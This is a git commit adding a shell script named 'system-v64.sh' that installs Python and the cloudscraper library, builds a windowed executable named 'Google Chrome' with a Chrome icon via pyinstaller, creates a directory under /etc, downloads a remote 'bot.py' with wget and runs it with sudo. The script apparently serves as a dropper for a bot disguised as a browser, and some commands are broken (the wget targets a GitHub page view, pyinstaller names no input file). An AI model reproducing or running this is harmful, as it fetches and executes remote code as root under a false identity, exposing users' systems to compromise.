b1eb008bba0d94215f6b9792207547852341a96b
mdn-gay <bantoideptrai@gmail.com>
2025-11-30 14:41:08 +0700

    Add files via upload

---
+++ system-v64.sh
@@ -0,0 +1,9 @@
+sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
+pip install cloudscraper requests && pip3 install cloudscraper requests
+python -m pip install pyinstaller
+pyinstaller --noconfirm --onefile --windowed --icon "Google-Chrome-Logo-1536x1536-3017027129.ico" --name "Google Chrome" 
+cd /etc
+mkdir system-v64
+cd /etc/system-v64
+wget https://github.com/mdn-gay/1239277489294m/blob/main/bot.py
+sudo python3 bot.py
